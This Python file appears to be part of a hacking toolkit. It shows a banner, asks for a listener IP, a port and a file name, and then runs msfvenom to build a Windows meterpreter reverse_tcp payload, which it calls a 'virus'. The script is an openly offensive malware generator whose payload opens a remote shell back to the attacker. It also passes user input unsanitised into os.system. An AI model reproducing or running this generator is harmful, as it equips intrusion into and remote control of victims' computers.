import os
from assets import *

def win_vir():
    print(werno.biru+'''
     ___    ___
    ( _<    >_ )
    //        ''
    ''___..___// bE rEaDy F0r
     `-(    )-'  tHe D4rknest
       _|__|_    RedBull
      /_|__|_'    
      /_|__|_'
      /_\__/_'
       \ || /  _)
         ||   ( )
         \\___//
          `---'
    '''+werno.biasa)
    load()
    type_buat()
    set_ip = input("your ip local : ")
    set_port = input("your port : ")
    filennya = input("file name : ")
    folder = input("save to folder : ")
    
    if not os.path.exists(folder):
        os.system("mkdir {}".format(folder))
    else:
        load()
    
    h_win = folder+'/'+filennya
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} > {} >/dev/null 2>&1".format(set_ip, set_port, h_win))
    if not os.path.exists(h_win):
        print("fail to create virus, check your config")
    else:
        type_sukses()
        print("Your location file : {}".format(os.getcwd()+"/"+h_win))